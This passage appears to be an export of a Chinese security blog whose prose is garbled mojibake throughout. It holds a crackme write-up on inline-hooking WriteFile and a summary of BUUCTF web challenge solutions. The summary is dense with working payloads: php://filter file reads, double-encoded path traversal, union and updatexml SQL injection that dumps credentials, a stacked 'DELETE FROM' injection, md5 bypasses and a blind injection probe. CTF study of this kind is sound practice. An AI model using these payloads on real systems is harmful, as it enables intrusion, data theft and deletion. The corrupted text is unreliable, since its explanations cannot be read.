//0E9hæ‹¼æ¥å½¢æˆjmpè·³è½¬æŒ‡ä»¤æ”¹å˜åŸæœ¬è¦è·³è½¬åˆ°.text:004012BA push 5 ; Size //writefileå‡½æ•°ä¸ºåˆ°è‡ªå®šä¹‰çš„mywritefileå‡½æ•°.text:004012BC lea ecx, [ebp+var_20].text:004012BF push ecx ; Src.text:004012C0 mov edx, [ebp+var_C].text:004012C3 push edx ; void * .text:004012C4 call _memcpy //ç¬¬ä¸‰ä¸ªmemcpyå‡½æ•°å°†jmpæŒ‡ä»¤å†™åˆ°writefileå‡½æ•°.text:004012C9 add esp, 0Ch //ä¸­æ”¹å˜åŸæœ‰å‡½æ•°å®ç°hook.text:004012CC mov esi, esp.text:004012CE lea eax, [ebp+flOldProtect].text:004012D1 push eax ; lpflOldProtect.text:004012D2 mov ecx, [ebp+flOldProtect].text:004012D5 push ecx ; flNewProtect.text:004012D6 push 5 ; dwSize.text:004012D8 mov edx, [ebp+var_C].text:004012DB push edx ; lpAddress.text:004012DC call ds:VirtualProtect //æœ€åè°ƒç”¨virtualProtectå‡½æ•°.text:004012E2 cmp esi, esp.text:004012E4 call __chkesp.text:004012E9 åŠ¨æ€åˆ†æåˆ†åˆ«åœ¨ä¸»å‡½æ•°çš„è°ƒç”¨writefileå‡½æ•°ä»¥åŠmywritefileå‡½æ•°çš„è°ƒç”¨ä¸­è®¾ç½®æ–­ç‚¹ï¼Œå¦åˆ™åŠ¨æ€åˆ†ææ—¶ç¨‹åºä¼šè‡ªåŠ¨è¿è¡Œåˆ°ç»“å°¾ï¼Œmywritefile: ï¼ˆps:ç›´æ¥åŸºäºåœ°å€è¿›è¡Œè°ƒç”¨ï¼Œè€Œä¸æ˜¯åŸºäºå‡½æ•°åï¼‰ ä¸»å‡½æ•°ï¼š ä½¿ç”¨IDAçš„åŠ¨æ€åˆ†æ ç¨‹åºè¿è¡Œååœ¨ä¸»å‡½æ•°çš„æ–­ç‚¹å¤„åœæ­¢ï¼Œå°†è¦è°ƒç”¨writefileå‡½æ•°ï¼Œå•æ­¥æ­¥å…¥è§‚å¯Ÿ å‘ç°kernel32 writefileå‡½æ•°çš„æŒ‡ä»¤å‘ç”Ÿæ”¹å˜ï¼Œç”±äºä¿®æ”¹äº†writefileå‡½æ•°çš„å‰5ä¸ªå­—èŠ‚å¯¼è‡´ç¬¬ä¸€æ¡æŒ‡ä»¤å˜ä¸ºè·³è½¬åˆ°sub_40100A(mywriteå‡½æ•°)ï¼Œä¹‹åçš„æŒ‡ä»¤ç”±äºæ±‡ç¼–çš„çº¿æ€§æ‰«æç®—æ³•å¯¼è‡´æœºå™¨æŒ‡ä»¤è¢«æ‰“ä¹±ï¼Œå˜æˆäº†æ•°å­—ï¼Œç»§ç»­å•æ­¥æ­¥å…¥ï¼šå‘ç°è·³è½¬åˆ°äº†mywrite(su_40100A)çš„å…¥å£å¤„ ç»§ç»­è§‚å¯Ÿï¼Œè¿›å…¥mywritefileå‡½æ•° åœ¨mywriteå‡½æ•°ä¸­ 123456789101112131415161718192021222324252627282930313233343536373839404142434445 mov eax, ds:dword_428038 //ä¸ºæ–°å£°æ˜çš„buffæ•°ç»„ï¼Œ6B6F68hä¸º&#x27;hook&#x27;çš„åå…­è¿›åˆ¶æ•°.text:0040111D mov dword ptr [ebp+Str], eax.text:00401120 mov cl, ds:byte_42803C .text:00401126 mov [ebp+var_8], cl .text:00401129 call sub_401005 //è°ƒç”¨äº†unhookå‡½æ•°è„±é’©.text:0040112E mov esi, esp.text:00401130 push offset ProcName ; &quot;WriteFile&quot;.text:00401135 mov edi, esp.text:00401137 push offset ModuleName ; &quot;kernel32.dll&quot;.text:0040113C call ds:GetModuleHandleA .text:00401142 cmp edi, esp.text:00401144 call __chkesp.text:00401149 push eax ; hModule.text:0040114A call ds:GetProcAddress //è·å–kernel32ä¸­wrierfileçš„åœ°å€.text:00401150 cmp esi, esp.text:00401152 call __chkesp.text:00401157 mov [ebp+var_4], eax.text:0040115A mov esi, esp.text:0040115C mov edx, [ebp+arg_10].text:0040115F push edx.text:00401160 mov eax, [ebp+arg_C].text:00401163 push eax.text:00401164 lea ecx, [ebp+Str].text:00401167 push ecx ; Str.text:00401168 call _strlen.text:0040116D add esp, 4.text:00401170 push eax.text:00401171 lea edx, [ebp+Str].text:00401174 push edx.text:00401175 mov eax, [ebp+arg_0].text:00401178 push eax.text:00401179 call [ebp+var_4].text:0040117C cmp esi, esp.text:0040117E call __chkesp.text:00401183 mov eax, 1.text:00401188 pop edi.text:00401189 pop esi.text:0040118A pop ebx.text:0040118B add esp, 4Ch.text:0040118E cmp ebp, esp.text:00401190 call __chkesp.text:00401195 mov esp, ebp.text:00401197 pop ebp.text:00401198 retn 14h.text:00401198 sub_401100 endp å…ˆåˆ†æä¸€ä¸‹unhookå‡½æ•°ï¼ˆsub_401005ï¼‰ï¼Œå•æ­¥æ­¥å…¥ å…¶æ±‡ç¼–æŒ‡ä»¤ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051mov esi, esp.text:0040104A push offset ProcName ; &quot;WriteFile&quot;.text:0040104F mov edi, esp.text:00401051 push offset ModuleName ; &quot;kernel32.dll&quot;.text:00401056 call ds:GetModuleHandleA.text:0040105C cmp edi, esp.text:0040105E call __chkesp.text:00401063 push eax ; hModule.text:00401064 call ds:GetProcAddress //è·å–writefileå‡½æ•°çš„åœ°å€.text:0040106A cmp esi, esp.text:0040106C call __chkesp.text:00401071 mov [ebp+var_C], eax.text:00401074 mov eax, [ebp+var_C].text:00401077 mov [ebp+lpAddress], eax.text:0040107A mov esi, esp.text:0040107C lea ecx, [ebp+flOldProtect].text:0040107F push ecx ; lpflOldProtect.text:00401080 push 40h ; &#x27;@&#x27; ; flNewProtect.text:00401082 push 5 ; dwSize.text:00401084 mov edx, [ebp+lpAddress].text:00401087 push edx ; lpAddress.text:00401088 call ds:VirtualProtect //æ ¹æ®åœ°å€è·å–writefileçš„å‰5ä¸ªå­—èŠ‚.text:0040108E cmp esi, esp .text:00401090 call __chkesp.text:00401095 push 5 ; Size.text:00401097 push offset unk_42DC64 ; Src.text:0040109C mov eax, [ebp+lpAddress].text:0040109F push eax ; void *.text:004010A0 call _memcpy //è°ƒç”¨memcpyå‡½æ•°å°†ä¹‹å‰ä¿å­˜çš„writefileå‡½æ•°å‰5ä¸ªå­—èŠ‚å¤åŸ.text:004010A5 add esp, 0Ch.text:004010A8 mov esi, esp.text:004010AA lea ecx, [ebp+flOldProtect].text:004010AD push ecx ; lpflOldProtect.text:004010AE mov edx, [ebp+flOldProtect].text:004010B1 push edx ; flNewProtect.text:004010B2 push 5 ; dwSize.text:004010B4 mov eax, [ebp+lpAddress].text:004010B7 push eax ; lpAddress.text:004010B8 call ds:VirtualProtect //å†æ¬¡hookä½ä»¥ä¾¿ä¸‹æ¬¡æ“ä½œ.text:004010BE cmp esi, esp.text:004010C0 call __chkesp.text:004010C5 pop edi.text:004010C6 pop esi.text:004010C7 pop ebx.text:004010C8 add esp, 4Ch.text:004010CB cmp ebp, esp.text:004010CD call __chkesp.text:004010D2 mov esp, ebp.text:004010D4 pop ebp.text:004010D5 retn.text:004010D5 sub_401030 endp å›åˆ°mywriteå‡½æ•°ï¼Œmywriteå‡½æ•°è¿˜ä¼šé‡æ–°è°ƒç”¨writefileå‡½æ•°è¿›è¡Œæ–‡ä»¶å†™å…¥ï¼Œç›´æ¥è¿è¡Œåˆ°æ–­ç‚¹å¤„è¿›å…¥è°ƒç”¨çš„writeå‡½æ•°ä¸­è§‚å¯Ÿ å‘ç°writefileå‡½æ•°å‰5ä¸ªå­—èŠ‚å·²ç»è¢«å¤åŸï¼ŒæŒ‡ä»¤è¢«ä¿®å¤ writefileå‡½æ•°çš„åŠŸèƒ½å°±æ˜¯å°†mywritefileä¸­bufæ•°ç»„çš„å†…å®¹å†™å…¥æ–‡ä»¶ä¸­ï¼Œç›´æ¥è¿è¡Œç»“æŸï¼Œæ‰“å¼€æ–‡ä»¶å¤¹å‘ç°æ–°ç”Ÿæˆçš„pwd.txtå†…å®¹æ­£å¦‚åˆ†æçš„ä¸ºhook åœ¨ä¸»å‡½æ•°ç»“å°¾ï¼Œåˆå¯¹ç”Ÿæˆçš„pwdæ–‡ä»¶è¿›è¡Œæ‰«æï¼ˆå¤±è´¥åˆ™è¾“å‡ºscan fail)ï¼Œå¹¶ä¸è¾“å…¥çš„keyè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸¤è€…ç›¸ç­‰åˆ™è¾“å‡ºcongratulations!,å¦åˆ™è¾“å‡ºtry again! é™„æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt; BYTE pOrgByte[5] = &#123; 0, &#125;;typedef BOOL(WINAPI *PFWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);void unhook()&#123; DWORD dwOldProtect; PBYTE pWriteFile; FARPROC pFunc; pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); pWriteFile = (PBYTE)pFunc; VirtualProtect(pWriteFile, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); memcpy(pWriteFile, pOrgByte, 5); VirtualProtect(pWriteFile, 5, dwOldProtect, &amp;dwOldProtect);&#125;BOOL __stdcall MyWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)&#123; FARPROC pFunc; char buf[] =&quot;hook&quot;; unhook(); pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;WriteFile&quot;); ((PFWriteFile)pFunc)(hFile, buf, strlen(buf), lpNumberOfBytesWritten, lpOverlapped); return TRUE;&#125;int main()&#123; HANDLE hFile; HMODULE hKernel32; FARPROC pWriteFile; FILE *fp=NULL; FILE *fkey=NULL; PBYTE pEditFunc; BYTE pJmpCode[6] = &#123; 0xE9,0, &#125;; char pwd[15]; char key[15]; int ret; DWORD dwOldProtect, pOffset,dwWritenSize; char buf[] = &quot;real_pwd&quot;; hKernel32 = GetModuleHandle(&quot;kernel32.dll&quot;); pWriteFile = GetProcAddress(hKernel32, &quot;WriteFile&quot;); pEditFunc = (PBYTE)pWriteFile; if (VirtualProtect(pEditFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) &#123; memcpy(pOrgByte, pEditFunc, 5); pOffset = (ULONGLONG)MyWriteFile - (ULONGLONG)pWriteFile - 5; memcpy(&amp;pJmpCode[1], &amp;pOffset, 4); memcpy(pWriteFile, &amp;pJmpCode[0], 5); VirtualProtect(pWriteFile, 5, dwOldProtect, &amp;dwOldProtect); &#125; hFile = CreateFile(&quot;pwd.txt&quot;, GENERIC_ALL,0, NULL, CREATE_ALWAYS, 0x80, NULL); /* if(hFile!=NULL) printf(&quot;open1 success\\n&quot;); else printf(&quot;open1 fail\\n&quot;); */ WriteFile(hFile, buf, strlen(buf), &amp;dwWritenSize, NULL); CloseHandle(hFile); if(fp=fopen(&quot;pwd.txt&quot;,&quot;r&quot;)) printf(&quot;open success\\n&quot;); else printf(&quot;open fail\\n&quot;); if(fp!=NULL) fscanf(fp,&quot;%s&quot;,pwd); else printf(&quot;scan fail\\n&quot;); printf(&quot;plz input key\\n&quot;); scanf(&quot;%s&quot;,key); if(fp!=NULL) fclose(fp); ret=lstrcmp(key,pwd); //å°†è¾“å…¥çš„keyå’Œpwdè¿›è¡Œæ¯”è¾ƒ if(ret == 0) printf(&quot;congratulations!\\n&quot;); else printf(&quot;try again!\\n&quot;); system(&quot;Pause&quot;); return 0; &#125;","categories":[],"tags":[]},{"title":"","slug":"ã€BUUCTFåˆ·é¢˜ã€‘Webè§£é¢˜æ–¹æ³•æ€»ç»“ï¼ˆä¸€)","date":"2021-05-08T15:03:36.190Z","updated":"2021-05-08T15:02:54.719Z","comments":true,"path":"undefined/ã€BUUCTFåˆ·é¢˜ã€‘Webè§£é¢˜æ–¹æ³•æ€»ç»“ï¼ˆä¸€).html","link":"","permalink":"http://k4oer.gitee.io/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html","excerpt":"","text":"@TOC å‰è¨€1è¾¹åˆ·é¢˜è¾¹æ€»ç»“äº›çŸ¥è¯†ç‚¹ï¼Œè¿˜åœ¨æ›´æ–°ï¼Œå†²ï¼ ä¿¡æ¯æœé›†1.dirsearchä½¿ç”¨ä¸‹è½½åœ°å€ï¼šhttps://github.com/maurosoria/dirsearchåˆ‡æ¢åˆ°å®‰è£…ç›®å½• 1py dirsearch.py -u ç½‘å€ -e è¯­è¨€ï¼ˆä¸€èˆ¬ç”¨*ï¼‰ -u æŒ‡å®šurl-e æŒ‡å®šç½‘ç«™è¯­è¨€ SQLç¼ºçœpayloadï¼š*,1 æŸ¥è¯¢è¯­å¥ï¼šselect *,1||flag from Flag è§£é¢˜æ€è·¯2ï¼špayload:1;set sql_mode=PIPES_AS_CONCAT;select 1 è§£æï¼š åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ã€‚ä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_modeæ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚ ä»£ç å®¡è®¡1.ä½¿ç”¨phpä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ã€‚ä½¿ç”¨filterè¿‡æ»¤å™¨ 1?file=php://filter/convert.base64-encode/resource=flag.php ä¾‹é¢˜ï¼šBUUCTFweb Secret FileæŠ“åŒ… phpmyadmin 4.8.1çš„ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å«çš„æ¼æ´(CVE) ç™½åå•éªŒè¯ï¼šä¾‹é¢˜ï¼šBUUCTF web warmupç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) ##ä¸èƒ½ä¸ºç©º &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) ##æ˜¯å­—ç¬¦ä¸² &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ##ä¸Šé¢checkfileè¿”å›ä¸ºtrue ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; åˆ†æ checkfile()å‡½æ•°å®šä¹‰äº†ä¸€ä¸ªç™½åå•ï¼šsource.phpå’Œhint.phpï¼Œåˆ¤æ–­ $pageæ˜¯å¦ä¸ºç©ºã€æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ã€‚åˆ¤æ–­ $pageæ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œè‹¥å­˜åœ¨è¿”å›trueï¼›è€ƒè™‘åˆ°pageæœ‰å‚æ•°çš„æƒ…å†µï¼Œ $_pageæ˜¯å–å‡º $pageé—®å·å‰çš„ä¸œè¥¿ï¼Œç„¶åå†åˆ¤æ–­ $_pageæ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œè‹¥å­˜åœ¨åˆ™è¿”å›trueï¼›ä¸¤ä¸ªå‡½æ•°ä¸€ä¸ªmb_substrå’Œmb_strposï¼Œæ€»çš„æ„æ€å°±æ˜¯æˆªå–å˜é‡pageä¸­?å‰é¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åå†è¿›è¡Œç™½åå•æ ¡éªŒã€‚ä¹‹åæ˜¯urläºŒæ¬¡ç¼–ç é—®é¢˜ï¼Œéœ€è¦å°†?è¿›è¡ŒäºŒæ¬¡urlç¼–ç æ‰€ä»¥æ„é€ payloadï¼š 123file=hint.php%253f/../../../../../../../../ffffllllaaaaggggæˆ–è€…file=hint.php?file://../../../../../ffffllllaaaagggg 1å› ä¸ºæœåŠ¡å™¨ä¼šè‡ªåŠ¨è§£ä¸€æ¬¡ç ï¼Œæ‰€ä»¥ $pageçš„å€¼ä¸ºhint.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaaggggï¼Œåˆä¸€æ¬¡urlè§£ç åï¼Œ$_pageçš„å€¼ä¸ºhint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,ç„¶åæˆªå–é—®å·å‰é¢çš„hint.phpåˆ¤æ–­åœ¨ç™½åå•é‡Œè¿”å›trueã€‚ SQLæ³¨å…¥å¸¸è§„æµç¨‹ä½¿ç”¨hackbar1.åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ 1&#x27;or 1=1 # å¦‚æœæ˜¯æ•´å½¢ï¼Œä»–çš„æŠ¥é”™ä¿¡æ¯åº”ä¸ºâ€œ â€™ â€œ é‚£æˆ‘ä»¬éœ€è¦é—­åˆï¼Œç”±äºè¿™ä¸ªé¢˜ç›®æ²¡æœ‰è¿‡æ»¤ä»»ä½•sqlæ³¨å…¥çš„å…³é”®å­—ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨ %23ï¼ˆ#ï¼‰æ¥è¿›è¡Œé—­åˆsqlè¯­å¥ 2.çˆ†åˆ—æ•° 1?username=1&amp;password=11&#x27; order by 3%23 ä¸€èˆ¬ä¸º3æ—¶æœ‰å›æ˜¾ï¼Œå­—æ®µæ•°ä¸º3 3.çˆ†åº“ 1?username&#x3D;1&amp;password&#x3D;11&#39; union select 1,version(),database()%23 4.çˆ†è¡¨å 1?username=123&amp;password=111&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 5.çˆ†è¡¨ 123?username=1&amp;&amp;password=1&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #æˆ–?username=1&amp;&amp;password=1&#x27; union select 1,2,group_concat(concat_ws(&#x27;-&#x27;,id,username,password)) from l0ve1ysq1%23 ps:åŠŸèƒ½å‡½æ•°1.concat_ws()å‡½æ•° åŠŸèƒ½ï¼šä¸€æ¬¡æ€§æŒ‡å®šåˆ†éš”ç¬¦ è¯­æ³•ï¼šconcat_ws(separator,str1,str2,â€¦) è¯´æ˜ï¼šç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ åˆ†éš”ç¬¦ä¸èƒ½ä¸ºç©º å¦‚æœä¸ºNULL åˆ™è¿”å›å€¼NULL 2.concat()å‡½æ•° åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸² è¯­æ³•ï¼šconcat(str1,str2,â€¦) è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸² å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºNULL åˆ™è¿”å›å€¼NULL 3.group_concat( [DISTINCT] è¦è¿æ¥çš„å­—æ®µ [Order BY æ’åºå­—æ®µ ASC/DESC] [Separator â€˜åˆ†éš”ç¬¦â€™] ) å³æŒ‰éœ€æ±‚æ‰“å°å†…å®¹ BUUCTF HardSQLä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦è¯•å‘ç°å¾ˆå¤šå­—ç¬¦å¦‚and,unionéƒ½è¢«è¿‡æ»¤å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨()åˆ†å‰²è¯­å¥è¾¾åˆ°ä»£æ›¿ç©ºæ ¼çš„æ•ˆæœã€‚=è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨likeæ›¿ä»£ã€‚å°è¯•ç”¨updatexmlæŠ¥é”™æ³¨å…¥ 1check.php?username=1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=2 çˆ†å‡ºåº“å çˆ†è¡¨å 1check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e),1))%23&amp;password&#x3D;2 çˆ†åˆ—å 1check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;2 å› ä¸ºupdataxmlé™åˆ¶è¯­å¥ä¸º32ä½ï¼Œè€Œflagé•¿åº¦å¤§äº32ä½ï¼Œæ‰€ä»¥ç”¨leftå’Œrightå‡½æ•°æ‹¼æ¥ 1234å‰åŠéƒ¨åˆ† check.php?username=1&#x27;or(updatexml(1,concat(0x7e,(select((left(password,30)))from(H4rDsq1)),0x7e),1))%23&amp;password=2ååŠéƒ¨åˆ† ![check.php?username=1&#x27;or(updatexml(1,concat(0x7e,(select((right(password,30)))from(H4rDsq1)),0x7e),1))%23&amp;password=2](https://img-blog.csdnimg.cn/20210405154340430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70) å‚è€ƒæ–‡ç« ï¼šã€extractvalueæŠ¥é”™æ³¨å…¥ã€‘https://blog.csdn.net/qin9800/article/details/113446035 å †å æ³¨å…¥åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚ æŸ¥çœ‹è¡¨çš„è¯­å¥ï¼Œåœ¨windowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·ï¼ˆ`ï¼‰æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦ 1â€™;desc 1919810931114514; çŸ¥è¯†ç‚¹1ï¼šå †å æ³¨å…¥åœ¨SQLä¸­ï¼Œåˆ†å·æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚å¦‚æœåœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œæ•ˆæœå°±æ˜¯åˆ†åˆ«æ‰§è¡Œä¸¤æ¡sqlè¯­å¥ã€‚ç”±äºä¸¤æ¡è¯­å¥å †å åœ¨åŒä¸€è¡Œï¼Œè€Œä¸æ˜¯åŸæœ¬åº”è¯¥å„è‡ªå æ®ä¸€è¡Œï¼Œæ‰€ä»¥è¿™ç§æ³¨å…¥æˆä¸ºå †å æ³¨å…¥ã€‚ çŸ¥è¯†ç‚¹2å½“æ•°å­—å‹å­—ç¬¦ä½œä¸ºå­—æ®µã€è¡¨ã€åº“åæŸ¥è¯¢æ—¶ï¼Œåº”è¯¥ç”¨åå•å¼•å·æ‹¬èµ·æ¥ mysqlé¢„å¤„ç†è¯­å¥ 123PREPARE sqla from &#x27;[my sql sequece]&#x27;; é¢„å®šä¹‰SQLè¯­å¥EXECUTE sqla; æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE sqla; åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ é€šè¿‡å˜é‡è¿›è¡Œä¼ é€’SET @tn = â€˜flagâ€™; å­˜å‚¨è¡¨åSET @sql = concat(â€˜select * from â€˜, @tn); å­˜å‚¨SQLè¯­å¥PREPARE sqla from @sql; é¢„å®šä¹‰SQLè¯­å¥EXECUTE sqla; æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE sqla; åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ PREPAREè¯­å¥å‡†å¤‡å¥½ä¸€æ¡SQLè¯­å¥ï¼Œå¹¶åˆ†é…ç»™è¿™æ¡SQLè¯­å¥ä¸€ä¸ªåå­—ä¾›ä¹‹åè°ƒç”¨ã€‚å‡†å¤‡å¥½çš„SQLè¯­å¥é€šè¿‡EXECUTEå‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡DEALLOCATE PREPAREå‘½ä»¤é‡Šæ”¾æ‰ã€‚ ä½¿ç”¨MD5å‡½æ•°å®ç°sqlæ³¨å…¥BUUCTF easy MD51.çŸ¥è¯†ç‚¹ï¼šï¼ˆ1ï¼‰MD5å‡½æ•°åœ¨åŠ å¯†ffifdyopåè¿”å›åŸå§‹å­—ç¬¦ä¸²â€™orâ€™6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c ï¼Œå¦å¤–mysqlä¸­ä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å½¢å¤„ç†ä¾‹å¦‚â€˜6abcâ€™=6ã€‚ï¼ˆ2ï¼‰md5ç»•è¿‡ï¼šå› ä¸ºmd5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œå› ä¸ºNULL=NULLï¼Œå¯ä»¥å®ç°ç»•è¿‡ï¼Œä¼ å…¥æ•°ç»„ï¼Œä½¿å¾— md5 å¤„ç†ä¸¤ä¸ªå‚æ•°éƒ½è¿”å› 0 å³å¯ï¼š payload:?a[]=1&amp;b[]=2æˆ–è€…ä¼ å…¥ä¸¤ä¸ªmd5å¤„ç†åä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸² 1234567ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼šQNKCDZO240610708s878926199as155964671as214587387as214587387a 2.è§£é¢˜éšä¾¿è¾“å…¥åæŠ“åŒ…å‘ç°Hintä¸­æœ‰æç¤ºåˆ©ç”¨md5ç‰¹æ€§ä¼ å…¥ffifdyopï¼Œä½¿å¾—selectè¯­å¥ä¸ºï¼š 1select * from &#x27;admin&#x27; where password=&#x27; &#x27;or &#x27;6&#x27; è¿™æ ·å°±ç›¸å½“äºsqlè¯­å¥ä¸ºæ°¸çœŸå®ç°æ³¨å…¥å¾—åˆ°è®¿é—®é¡µé¢å‘ç°äº†phpé¡µé¢åˆ©ç”¨md5ç»•è¿‡å¾—åˆ°è®¿é—®é¡µé¢åŒæ ·ä¸ºä¸€ä¸ªmd5ç»•è¿‡çš„phpé¡µé¢ï¼Œæ˜“å¾—flag ä¾‹é¢˜BUUCTF WEB [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World(SQLç›²æ³¨ï¼ŒPHPï¼‰ é¢˜ç›®æè¿°: å·²çŸ¥è¡¨åå’Œåˆ—åï¼Œå¹¶ä¸”å‘ç°è¿‡æ»¤äº†å¾ˆå¤šsqlå­—ç¬¦ï¼Œå°è¯•æ³¨å…¥ 11^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)^1 å¥‰ä¸Šå¤§ä½¬è„šæœ¬ 